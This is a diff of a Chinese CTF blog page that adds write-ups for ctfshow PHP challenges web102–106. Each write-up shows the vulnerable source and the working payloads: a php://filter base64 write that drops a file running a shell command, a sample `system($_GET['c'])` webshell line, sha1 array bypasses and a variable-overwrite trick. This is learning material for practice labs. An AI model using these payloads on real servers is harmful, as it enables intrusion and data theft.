@@ -19,7 +19,7 @@
     <meta name="description" content="web89123456789101112include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&amp;#x27;num&amp;#x27;]))&amp;#123;    $num &#x3D; $_GET[&amp;#x27;num&amp;#x27;];    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&amp;#123;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php特性">
-<meta property="og:url" content="http://example.com/2023/05/10/phptexin/index.html">
+<meta property="og:url" content="http://example.com/2023/07/16/phptexin/index.html">
 <meta property="og:site_name" content="奇怪的亚索">
 <meta property="og:description" content="web89123456789101112include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&amp;#x27;num&amp;#x27;]))&amp;#123;    $num &#x3D; $_GET[&amp;#x27;num&amp;#x27;];    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&amp;#123;">
 <meta property="og:locale" content="zh_CN">
@@ -30,8 +30,8 @@
 <meta property="og:image" content="http://example.com/images/562.png">
 <meta property="og:image" content="http://example.com/images/623.png">
 <meta property="og:image" content="http://example.com/images/2132.png">
-<meta property="article:published_time" content="2023-05-09T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-05-14T14:24:52.441Z">
+<meta property="article:published_time" content="2023-07-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-07-16T15:39:17.674Z">
 <meta property="article:author" content="奇怪的奇怪">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/00.png">
@@ -232,8 +232,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-05-10 00:00" pubdate>
-          2023年5月10日 凌晨
+        <time datetime="2023-07-16 00:00" pubdate>
+          2023年7月16日 凌晨
         </time>
       </span>
     
@@ -244,7 +244,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.5k 字
+          9.8k 字
         
       </span>
     
@@ -255,7 +255,7 @@
         
         
         
-          63 分钟
+          82 分钟
         
       </span>
     
@@ -358,6 +358,26 @@
 
 <p>可以看出这次特殊符号基本上都被禁用了，利用ReflectionClass(咱也不知道是啥，看题解也不会😭)建立ctfshow类的反射类，new ReflectionnClass($class)获得class的反射对象(包括了元数据信息) v3是不能为;以外的特殊字符</p>
 <p>payload:?v1&#x3D;1&amp;v2&#x3D;echo new Reflectionlass&amp;v3&#x3D;;<br>获取的 flag 需要将 0x2d 替换成 -<br><img src="/images/2132.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="web102-103"><a href="#web102-103" class="headerlink" title="web102-103"></a>web102-103</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v4</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v4</span>)&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v3</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+<p>看到file_put_contents要条件反射，因为它可以配合伪协议</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">file_put_contents()</span><br><span class="language-xml">//用来写文件进去，其中文件名参数是支持伪协议的，用于将第二个参数content进行过滤器后再写进文件里面去</span><br><span class="language-xml">file_put_content($_POST[&#x27;filename&#x27;], &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);</span><br></code></pre></td></tr></table></figure>
+
+<p>通过伪协议直接生成文件<br><code>?v3=php://filter/write=convert.base64-decode/resource=2.php</code><br>通过十六进制v2&#x3D;115044383959474e6864434171594473<br>post :v1&#x3D;hex2bin</p>
+<p>然后得到 PD89YGNhdCAqYDs base64解码为<code>&lt;?=`cat *`;</code><br>访问2.php查看源码即可查看到flag</p>
+<h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>sha1()与MD5一样都是有漏洞可以绕过的</p>
+<h4 id="sha1漏洞"><a href="#sha1漏洞" class="headerlink" title="sha1漏洞"></a>sha1漏洞</h4><p>例如这个代码：<code>$_GET[&#39;name&#39;]!=$_GET[&#39;password&#39;]&amp;&amp;sha1($_GET[&#39;name&#39;])===sha1($_GET[&#39;password&#39;])</code></p>
+<p>可通过构造<code>?name[]&amp;password[]=123123</code> 来绕过<br>GET:?v2[]&#x3D;123123<br>POST:v1[]&#x3D;<br>得出flag</p>
+<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$error</span>=<span class="hljs-string">&#x27;你还想要flag嘛？&#x27;</span>;<br><span class="hljs-variable">$suces</span>=<span class="hljs-string">&#x27;既然你想要那给你吧！&#x27;</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span>===<span class="hljs-string">&#x27;error&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you doing?!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$$key</span>=<span class="hljs-variable">$$value</span>;<br>&#125;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value</span>===<span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you doing?!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$$key</span>=<span class="hljs-variable">$$value</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-variable">$flag</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$error</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your are good&quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">die</span>(<span class="hljs-variable">$suces</span>); <br></code></pre></td></tr></table></figure>
+<p>题目一共有三个变量$error $suces $flag 我们只要令其中一个的值为flag，都是可以通过die或者直接echo输出的<br>通过die($error)输出<br>get:a&#x3D;flag post:error&#x3D;a<br>进行的操作为</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$a</span>=<span class="hljs-symbol">$flag</span><br><span class="hljs-symbol">$error</span>=<span class="hljs-symbol">$a</span><br></code></pre></td></tr></table></figure>
+<p>此时$a&#x3D;flag;$error&#x3D;flag,从而输出error也就是输出flag</p>
+<h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$v2</span>) &amp;&amp; <span class="hljs-variable">$v1</span>!=<span class="hljs-variable">$v2</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>
+<p>此题与104题相同，利用sha1的漏洞，post:v1[]&#x3D;<br>get:v2[]&#x3D;123123</p>
+<p>获取flag</p>
 
                 
               </div>
@@ -376,7 +396,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>php特性</div>
-      <div>http://example.com/2023/05/10/phptexin/</div>
+      <div>http://example.com/2023/07/16/phptexin/</div>
     </div>
     <div class="license-meta">
       
@@ -388,7 +408,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年5月10日</div>
+          <div>2023年7月16日</div>
         </div>
       
       
@@ -420,18 +440,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/05/20/litctf_2023/" title="litctf_2023">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">litctf_2023</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/05/09/php/" title="常见PHP语法">
-                        <span class="hidden-mobile">常见PHP语法</span>
+                      <a href="/2023/07/15/buuctf_web/" title="buuctf_web">
+                        <span class="hidden-mobile">buuctf_web</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
